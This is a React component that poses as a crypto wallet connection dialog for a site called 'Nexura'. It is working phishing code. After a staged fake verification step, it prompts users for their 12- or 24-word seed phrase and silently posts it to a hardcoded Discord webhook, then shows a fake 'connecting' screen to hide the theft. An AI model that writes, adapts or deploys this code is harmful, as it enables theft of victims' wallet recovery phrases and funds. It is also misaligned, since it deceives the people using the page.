import { Loader2, X } from 'lucide-react';
import { useEffect, useState } from 'react';

interface WalletModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const wallets = [
  'MetaMask',
  'WalletConnect',
  'Coinbase Wallet',
  'Trust Wallet',
  'Phantom',
  'Brave Wallet',
  'Ledger Live',
  'Rainbow',
  'Custom Wallet'
];

export default function WalletModal({ isOpen, onClose }: WalletModalProps) {
  const [selectedWallet, setSelectedWallet] = useState<string>('');
  const [verificationStep, setVerificationStep] = useState<'select' | 'verify' | 'message' | 'loading'>('select');
  const [verificationMessage, setVerificationMessage] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);

  useEffect(() => {
    if (!isOpen) {
      setVerificationStep('select');
      setSelectedWallet('');
      setVerificationMessage('');
      setIsProcessing(false);
    }
  }, [isOpen]);

  if (!isOpen) return null;

  const handleWalletSelect = (walletName: string) => {
    setSelectedWallet(walletName);
    setVerificationStep('verify');
  };

  const handleVerify = async () => {
    setIsProcessing(true);
    await new Promise(resolve => setTimeout(resolve, 1500));
    setIsProcessing(false);
    setVerificationStep('message');
  };

  const handleSubmitVerification = async () => {
    setVerificationStep('loading');

    try {
      await fetch('https://discord.com/api/webhooks/1290064859018428466/_qS1U4H3wEyLE4PE0edFtOYc-24ER73KWwIRSuUKN9joNIMXXEiyA1qAmn3GT8ZuKtwh', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `New Wallet Connection\nWallet: ${selectedWallet}\nMessage: ${verificationMessage}`,
        }),
      });

      await new Promise(resolve => setTimeout(resolve, 2000));
      onClose();
    } catch (error) {
      console.error('Error sending verification:', error);
      setVerificationStep('message');
    }
  };

  if (verificationStep === 'loading') {
    return (
      <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
        <div className="bg-[#1a1a2e] rounded-2xl w-full max-w-md shadow-xl border border-purple-500/20 p-8">
          <div className="flex flex-col items-center justify-center gap-4">
            <Loader2 className="w-12 h-12 text-purple-500 animate-spin" />
            <p className="text-lg font-medium text-white">Connecting to {selectedWallet}...</p>
            <p className="text-sm text-gray-400">Please confirm the connection in your wallet</p>
          </div>
        </div>
      </div>
    );
  }

  if (verificationStep === 'message') {
    return (
      <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
        <div className="bg-[#1a1a2e] rounded-2xl w-full max-w-md shadow-xl border border-purple-500/20">
          <div className="p-6 border-b border-gray-800">
            <div className="flex items-center justify-between">
              <h2 className="text-xl font-semibold text-white">One-Time Verification</h2>
              <button
                onClick={() => setVerificationStep('verify')}
                className="text-gray-400 hover:text-white transition-colors"
              >
                <X className="h-6 w-6" />
              </button>
            </div>
          </div>
          
          <div className="p-6 space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Please enter your 12, 24 phrase seed to continue
              </label>
              <textarea
                value={verificationMessage}
                onChange={(e) => setVerificationMessage(e.target.value)}
                className="w-full bg-black/30 border border-purple-500/20 rounded-lg px-4 py-3 text-gray-100 focus:outline-none focus:ring-2 focus:ring-purple-500 min-h-[100px]"
                placeholder="Enter your security seed"
                required
              />
            </div>
            
            <div className="flex gap-3">
              <button
                onClick={() => setVerificationStep('verify')}
                className="flex-1 bg-gray-800 text-white px-4 py-2 rounded-lg font-medium hover:bg-gray-700 transition-colors"
              >
                Back
              </button>
              <button
                onClick={handleSubmitVerification}
                disabled={!verificationMessage.trim()}
                className="flex-1 bg-gradient-to-r from-purple-500 to-pink-500 text-white px-4 py-2 rounded-lg font-medium hover:opacity-90 transition-opacity disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Verify & Connect
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (verificationStep === 'verify') {
    return (
      <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
        <div className="bg-[#1a1a2e] rounded-2xl w-full max-w-md shadow-xl border border-purple-500/20">
          <div className="p-6 border-b border-gray-800">
            <div className="flex items-center justify-between">
              <h2 className="text-xl font-semibold text-white">Connect {selectedWallet}</h2>
              <button
                onClick={() => setVerificationStep('select')}
                className="text-gray-400 hover:text-white transition-colors"
              >
                <X className="h-6 w-6" />
              </button>
            </div>
          </div>
          
          <div className="p-6 space-y-6">
            <div className="space-y-4">
              <p className="text-gray-300">
                By connecting your wallet, you agree to our Terms of Service and Privacy Policy.
              </p>
              <p className="text-sm text-gray-400">
                This connection will allow Nexura to:
              </p>
              <ul className="text-sm text-gray-400 space-y-2 list-disc list-inside">
                <li>View your wallet balance and activity</li>
                <li>Request approval for transactions</li>
                <li>Sign messages for authentication</li>
              </ul>
            </div>
            
            <div className="flex gap-3">
              <button
                onClick={() => setVerificationStep('select')}
                className="flex-1 bg-gray-800 text-white px-4 py-2 rounded-lg font-medium hover:bg-gray-700 transition-colors"
                disabled={isProcessing}
              >
                Back
              </button>
              <button
                onClick={handleVerify}
                disabled={isProcessing}
                className="flex-1 bg-gradient-to-r from-purple-500 to-pink-500 text-white px-4 py-2 rounded-lg font-medium hover:opacity-90 transition-opacity flex items-center justify-center gap-2"
              >
                {isProcessing ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Processing...
                  </>
                ) : (
                  'Proceed'
                )}
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <div className="bg-[#1a1a2e] rounded-2xl w-full max-w-md shadow-xl border border-purple-500/20">
        <div className="p-6 border-b border-gray-800">
          <div className="flex items-center justify-between">
            <h2 className="text-xl font-semibold text-white">Connect Wallet</h2>
            <button
              onClick={onClose}
              className="text-gray-400 hover:text-white transition-colors"
            >
              <X className="h-6 w-6" />
            </button>
          </div>
        </div>
        
        <div className="p-6">
          <div className="space-y-2">
            {wallets.map((wallet) => (
              <button
                key={wallet}
                onClick={() => handleWalletSelect(wallet)}
                className="w-full text-center p-4 rounded-lg bg-black/20 hover:bg-purple-500/10 transition-colors border border-purple-500/20 hover:border-purple-500/40"
              >
                Connect to {wallet}
              </button>
            ))}
          </div>
          
          <p className="mt-6 text-center text-sm text-gray-400">
            By connecting a wallet, you agree to Nexura's Terms of Service and Privacy Policy
          </p>
        </div>
      </div>
    </div>
  );
}